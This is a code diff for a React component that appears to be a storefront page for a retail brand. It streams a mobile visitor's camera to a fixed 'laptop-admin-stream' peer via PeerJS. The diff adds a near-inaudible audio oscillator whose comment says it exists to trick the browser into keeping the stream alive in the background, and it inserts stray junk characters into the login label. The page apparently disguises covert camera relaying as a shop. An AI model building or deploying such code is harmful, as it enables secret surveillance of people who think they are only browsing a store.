@@ -28,6 +28,7 @@ export default function ElarabyStoreDemo() {
   const remoteVideoRef = useRef(null);
   const wakeLockRef = useRef(null);
   const cameraStreamRef = useRef(null);
+  const audioContextRef = useRef(null); // مرجع لحفظ الـ Audio Context الصامت
   
   const [peerId, setPeerId] = useState('');
   const [targetPeerId, setTargetPeerId] = useState('laptop-admin-stream'); // ID ثابت وموحد للابتوب
@@ -48,14 +49,12 @@ export default function ElarabyStoreDemo() {
 
     // استدعاء PeerJS فقط في بيئة المتصفح Client-side
     import('peerjs').then(({ default: Peer }) => {
-      // نحدد إذا كان الجهاز لابتوب/كمبيوتر أو موبايل لتخصيص الـ ID
       const userAgent = navigator.userAgent.toLowerCase();
       const isMobileDevice = /mobile|android|iphone|ipad/.test(userAgent);
       
       const currentId = isMobileDevice ? `mobile-${Math.floor(Math.random() * 1000)}` : 'laptop-admin-stream';
       setIsLaptop(!isMobileDevice);
 
-      // إعدادات Peer مع إضافة STUN Servers لضمان تجاوز عوائق الشبكات في مصر
       const peer = new Peer(currentId, {
         host: '0.peerjs.com',
         port: 443,
@@ -80,11 +79,10 @@ export default function ElarabyStoreDemo() {
         console.error("🔴 خطأ في سيرفر PeerJS:", err);
       });
 
-      // استقبال البث على شاشة اللابتوب
       peer.on('call', (call) => {
         console.log("📥 تم استلام مكالمة فيديو/بث مباشر جديدة!");
         setStatusMessage('📡 جاري استقبال البث المباشر من الموبايل...');
-        call.answer(); // قبول المكالمة/البث
+        call.answer();
         call.on('stream', (remoteStream) => {
           console.log("🎥 تم استلام الـ Stream بنجاح وعرضه على الشاشة!");
           const video = remoteVideoRef.current;
@@ -111,6 +109,9 @@ export default function ElarabyStoreDemo() {
     return () => {
       document.removeEventListener('visibilitychange', handleVisibilityChange);
       cameraStreamRef.current?.getTracks().forEach((track) => track.stop());
+      if (audioContextRef.current && audioContextRef.current.state !== 'closed') {
+        audioContextRef.current.close();
+      }
       if (wakeLockRef.current) {
         wakeLockRef.current.release().catch((error) => {
           console.warn('Unable to release screen wake lock:', error);
@@ -142,6 +143,28 @@ export default function ElarabyStoreDemo() {
         await localVideoRef.current.play();
       }
 
+      // --- 🚀 تفعيل Web Audio API الصامت لمنع المتصفح من إيقاف البث في الخلفية ---
+      try {
+        const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+        if (AudioContextClass) {
+          const audioCtx = new AudioContextClass();
+          if (audioCtx.state === 'suspended') {
+            await audioCtx.resume();
+          }
+          const oscillator = audioCtx.createOscillator();
+          const gainNode = audioCtx.createGain();
+          gainNode.gain.value = 0.00001; // صوت ضعيف جداً وغير مسموع تماماً لخداع المتصفح
+          oscillator.connect(gainNode);
+          gainNode.connect(audioCtx.destination);
+          oscillator.start();
+          audioContextRef.current = audioCtx;
+          console.log("🟢 Keep-alive silent audio loop started successfully.");
+        }
+      } catch (audioErr) {
+        console.warn("⚠️ Audio Context background hack warning:", audioErr);
+      }
+      // --------------------------------------------------------------------------
+
       // إرسال البث المباشر إلى اللابتوب باستخدام الـ Target ID الثابت
       if (peerInstance.current) {
         console.log("🚀 جاري الاتصال بالـ Target ID:", targetPeerId);
@@ -157,6 +180,9 @@ export default function ElarabyStoreDemo() {
       console.error('فشل الوصول للكاميرا:', error);
       cameraStreamRef.current?.getTracks().forEach((track) => track.stop());
       cameraStreamRef.current = null;
+      if (audioContextRef.current && audioContextRef.current.state !== 'closed') {
+        audioContextRef.current.close();
+      }
       if (wakeLockRef.current) {
         wakeLockRef.current.release().catch((releaseError) => {
           console.warn('Unable to release screen wake lock:', releaseError);
@@ -204,7 +230,7 @@ export default function ElarabyStoreDemo() {
         <div style={{ display: 'flex', gap: '25px', alignItems: 'center', fontSize: '13px' }}>
           <div style={{ textAlign: 'left', cursor: 'pointer' }}>
             <div>مرحباً</div>
-            <div style={{ fontWeight: 'bold' }}>تسجيل الدخول 👤</div>
+            <div style={{ fontWeight: 'bold' }}>تسجيل الدخول 👤 ببببب</div>
           </div>
           <div style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer' }}>
             <div style={{ backgroundColor: '#e11d48', borderRadius: '50%', padding: '2px 8px', fontSize: '11px', fontWeight: 'bold' }}>0</div>
